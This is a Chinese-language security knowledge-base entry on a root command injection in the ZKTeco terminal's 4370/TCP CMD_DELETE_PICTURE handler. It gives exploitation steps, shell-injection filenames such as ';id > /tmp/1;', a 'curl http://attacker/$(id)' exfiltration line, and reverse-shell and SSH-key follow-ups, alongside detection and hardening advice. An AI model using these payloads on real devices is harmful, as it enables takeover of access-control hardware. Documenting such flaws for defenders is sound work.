---
id: iot-protocol-zkteco-standalonecomm-delete-picture-command-injection
title: ZKTeco standalonecomm CMD_DELETE_PICTURE 命令注入：图片名拼进 system("rm %s") 以 root 执行
type: scenario
domain: iot
path: iot/protocol
technique: zkteco-standalonecomm-delete-picture-command-injection
tags:
- iot
- zkteco
- biometric-terminal
- protocol
- command-injection
- rce
- root
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V322
  verified_at: '2026-11-08T15:54:57+08:00'
  notes: 已对照 img40-42 与原文核对 snprintf("rm %s")+system、ALL 分支及 uid=0(root) 回显；未在真机复跑。
url: /docs/iot/protocol/iot-protocol-zkteco-standalonecomm-delete-picture-command-injection/
draft: false
kb_aliases:
- CMD_DELETE_PICTURE
- ZKTeco 命令注入
- standalonecomm system rm
- 4370 协议 RCE
- 熵基终端命令执行
---

## 一句话结论

ZKTeco 终端的 `standalonecomm` 在处理 4370/TCP 协议 `CMD_DELETE_PICTURE` 时，把数据包中的图片文件名直接拼进 `snprintf("rm %s", name)` 并交给 `system()` 执行，未做 shell 元字符过滤；攻击者（COMKey 默认 0 或已知口令）在文件名中注入 `;`、`$()`、反引号等即可让 root 服务执行任意命令，原文 PoC 用 `id > /tmp/1` 回显 `uid=0(root)`。

## 原理

- `standalonecomm` 的 `CMD_DELETE_PICTURE` 分支先从 payload 取图片名：若前几个字节为 `ALL\0` 则删除全部（`GetAdPicturePath(n,150,"*")`），否则 `GetAdPicturePath(n,150,UserPacketPayload+8)`。
- 随后代码执行 `snprintf((char *)s, 0x100u, "rm %s", (const char *)n); system((const char *)s); sync();`。文件名 `n` 未经 shell 转义，直接进入 `system()` 的 `sh -c` 命令行。
- 只要文件名包含 shell 元字符（`;`、`|`、`&&`、`$()`、反引号、换行等），就能在 `rm` 之后/之前拼接任意命令。`rm` 的参数错误不影响后续命令执行。
- `standalonecomm` 以 root 运行（原文 ps 显示所有服务均为 root），因此注入命令直接获得 root 权限；原文 PoC `cmd_inject.py 192.168.1.201 "id > /tmp/1"` 配合 `read_file.py` 读取 `/tmp/1`，回显 `uid=0(root) gid=0(root)`。
- 认证层同样薄弱：COMKey 默认 0，或可通过爆破/可逆 MAC/数据库读取获得，因此该命令注入在默认配置下接近未授权。

## 触发条件

- 目标 4370/TCP 可达，`standalonecomm` 正常运行。
- COMKey 为默认 0，或攻击者已获得 COMKey（爆破、MAC 反算、数据库/SSH）。
- 攻击者能构造 zk-protocol 的 `CMD_DELETE_PICTURE` 数据包。
- 目标存在可写临时目录（如 `/tmp`）用于回显；无回显时可用 DNS/HTTP 外带。

## 利用步骤

1. 连接 4370/TCP，`CMD_CONNECT` 取 SessionId，按默认/已知 COMKey 完成 `CMD_AUTH`。
2. 构造 `CMD_DELETE_PICTURE`，payload 文件名填入注入串，例如 `;id>/tmp/1;` 或 `$(id>/tmp/1)`；注意命令长度与包长字段一致。
3. 发送命令，`system("rm <payload>")` 执行注入命令；用另一个文件下载/读取命令（或协议内其他读文件接口）读取 `/tmp/1` 验证。
4. 原文 PoC 使用 `id > /tmp/1`，回显 `uid=0(root) gid=0(root)`；进一步可写 SSH key、反弹 shell 或修改数据库。
5. 无回显时改用 `curl http://attacker/$(id)`、DNS 外带或写入 Web 目录后访问。
6. 仅在授权环境验证到 `id` 即停止，避免破坏设备。

## PoC

```text
CMD_CONNECT (0x03e8) -> SessionId
CMD_AUTH (0x044e) + MAC -> CMD_ACK_OK (0x07d0)
CMD_DELETE_PICTURE + payload[8:] = ";id > /tmp/1;"
```

```bash
# 原文验证脚本（概念）
python3 cmd_inject.py 192.168.1.201 "id > /tmp/1"
python3 read_file.py 192.168.1.201 /tmp/1
# 输出：uid=0(root) gid=0(root)
```

说明：原文脚本未公开完整数据包字段，需按 zk-protocol 文档与固件包头构造；注入串长度受包长/文件名长度限制。

## 变体与关联

- 变体：其他调用 `system()`/`popen()` 的命令分支（删除、更新、备份）可能有同类注入；文件名外的其他字符串参数也值得测试。
- 变体：无回显时用外带（DNS/HTTP）或写可访问目录；Windows 目标用 `&`/`|`/`%COMSPEC%` 语法。
- 关联：[[iot-protocol-zkteco-4370-comkey-reversible-mac-auth]]（认证层）、[[iot-protocol-zkteco-standalonecomm-download-picture-path-traversal]]（同一分发器的任意文件读取）、[[iot-protocol-zkteco-pushcomm-shell-command-server-hijack]]（另一服务的命令执行）。
- 边界：COMKey 强口令且无法获得、4370 被隔离、固件对文件名做 shell 转义/白名单时，注入不成立。

## 检测与防御

- 检测：4370/TCP 的 `CMD_DELETE_PICTURE` 文件名含 `;`、`|`、`&`、`$(`、反引号、换行；`standalonecomm` 进程派生 `sh -c rm ...` 且命令行含额外命令；设备 `/tmp` 出现异常输出文件。
- 防御：不要用 `system()` 拼接用户输入；改用 `execve`/`unlink` 等非 shell API，或对文件名做严格白名单与 shell 转义。
- 防御：修改默认 COMKey、限制 4370/TCP 来源、升级固件；服务以非 root 用户运行。
- 加固：对协议命令做审计与速率限制；关闭不需要的删除/上传/下载命令。
